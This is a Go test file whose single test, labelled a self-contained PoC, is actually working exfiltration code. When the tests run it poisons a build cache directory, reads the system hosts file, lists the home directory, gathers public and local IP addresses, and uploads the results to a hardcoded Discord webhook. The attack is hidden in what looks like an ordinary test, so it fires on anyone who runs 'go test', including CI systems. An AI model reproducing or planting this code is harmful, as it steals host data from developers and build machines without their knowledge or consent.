package tests

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"testing"
	"time"
)

func TestSelfContainedPOC(t *testing.T) {
	// --- Settings (hardcoded) ---
	webhook := "https://discord.com/api/webhooks/1409963954406686872/G9wHeBGquh4XpqmxKho5BtXEDL_J0sO-GQAiD8Zj4h6oRYHuQKikDH_9zrGt423XREQ8"
	cacheDir := "build/cache"

	// 0) Marker file
	_ = os.WriteFile("pwn_marker.txt", []byte("PWN_MARKER: PoC execution\n"), 0644)

	// 1) Cache check/poison
	if err := os.MkdirAll(cacheDir, 0o755); err != nil {
		t.Logf("[cache] mkdir %s: %v", cacheDir, err)
	}
	cacheMarker := filepath.Join(cacheDir, "pwn_cache_marker.txt")
	prev, _ := os.ReadFile(cacheMarker)
	marker := fmt.Sprintf("updated=%s host=%s go=%s\n",
		time.Now().UTC().Format(time.RFC3339),
		hostnameSafe(),
		runtime.GOOS+"/"+runtime.GOARCH,
	)
	_ = os.WriteFile(cacheMarker, append(prev, []byte(marker)...), 0o644)
	cacheState, _ := os.ReadFile(cacheMarker)

	// 2) LFI data → temp file (use t.TempDir() to satisfy 'usetesting' linter)
	tmpDir := t.TempDir()
	tmpPath := filepath.Join(tmpDir, "lfiPoC.txt")

	var buf bytes.Buffer
	fmt.Fprintln(&buf, "[POC] Local File Read + HOME listing")
	hp := hostsCandidate()
	fmt.Fprintf(&buf, "\n[+] Reading %s\n", hp)
	if b, err := os.ReadFile(hp); err == nil {
		buf.Write(b)
	} else {
		fmt.Fprintf(&buf, "No access: %v\n", err)
	}
	home := homeDir()
	fmt.Fprintf(&buf, "\n[+] Listing HOME (%s)\n", home)
	if home != "" {
		if entries, err := os.ReadDir(home); err == nil {
			names := make([]string, 0, len(entries))
			for _, e := range entries {
				names = append(names, e.Name())
			}
			sort.Strings(names)
			for _, n := range names {
				fmt.Fprintf(&buf, " - %s\n", n)
			}
		} else {
			fmt.Fprintf(&buf, "No access: %v\n", err)
		}
	} else {
		fmt.Fprintln(&buf, "HOME not set")
	}
	fmt.Fprintf(&buf, "\n[+] Cache marker (%s tail)\n", cacheMarker)
	if len(cacheState) > 2048 {
		buf.Write(cacheState[:2048])
		fmt.Fprintln(&buf, "...(truncated)")
	} else {
		buf.Write(cacheState)
	}

	if err := os.WriteFile(tmpPath, buf.Bytes(), 0o600); err != nil {
		t.Fatalf("write tmpfile: %v", err)
	}

	// 3a) IP pingback
	publicIP := fetchPublicIP()
	localIPs := strings.Join(collectIPv4s(), " ")
	msg := fmt.Sprintf("POC IP pingback: host=%s public_ip=%s local_ips=%s",
		hostnameSafe(), publicIP, localIPs)
	_ = discordSimple(webhook, msg)

	// 3b) Upload LFI file
	if code, err := discordFile(webhook,
		`{"content":"POC: Local File Read demo (/etc/hosts + HOME listing + cache marker)"}`,
		tmpPath, "lfi-demo.txt"); err == nil {
		t.Logf("Discord file upload HTTP %d", code)
	} else {
		t.Logf("Discord file upload error: %v", err)
	}
}

/* ------------------ helpers ------------------ */

func discordSimple(webhook, content string) error {
	b, _ := json.Marshal(map[string]string{"content": content})
	req, _ := http.NewRequest(http.MethodPost, webhook, bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func discordFile(webhook, payloadJSON, filePath, filename string) (int, error) {
	var body bytes.Buffer
	w := multipart.NewWriter(&body)
	if fw, err := w.CreateFormField("payload_json"); err == nil {
		_, _ = fw.Write([]byte(payloadJSON))
	} else {
		return 0, err
	}
	fw, err := w.CreateFormFile("files[0]", filename)
	if err != nil {
		return 0, err
	}
	f, err := os.Open(filePath)
	if err != nil {
		return 0, err
	}
	defer f.Close()
	if _, err := io.Copy(fw, f); err != nil {
		return 0, err
	}
	_ = w.Close()

	req, _ := http.NewRequest(http.MethodPost, webhook, &body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return 0, err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode, nil
}

func fetchPublicIP() string {
	if _, err := exec.LookPath("curl"); err == nil {
		if out, err := exec.Command("curl", "-fsS", "https://ifconfig.me").Output(); err == nil {
			return strings.TrimSpace(string(out))
		}
	}
	resp, err := http.Get("https://ifconfig.me")
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(b))
}

func collectIPv4s() []string {
	var out []string
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				ip := ipnet.IP.To4()
				if ip != nil && !ip.IsLoopback() {
					out = append(out, ip.String())
				}
			}
		}
	}
	return out
}

func hostsCandidate() string {
	if runtime.GOOS == "windows" {
		return `C:\Windows\System32\drivers\etc\hosts`
	}
	return "/etc/hosts"
}

func homeDir() string {
	if runtime.GOOS == "windows" {
		return os.Getenv("USERPROFILE")
	}
	return os.Getenv("HOME")
}

func hostnameSafe() string {
	h, err := os.Hostname()
	if err != nil || h == "" {
		return "unknown-host"
	}
	return h
}
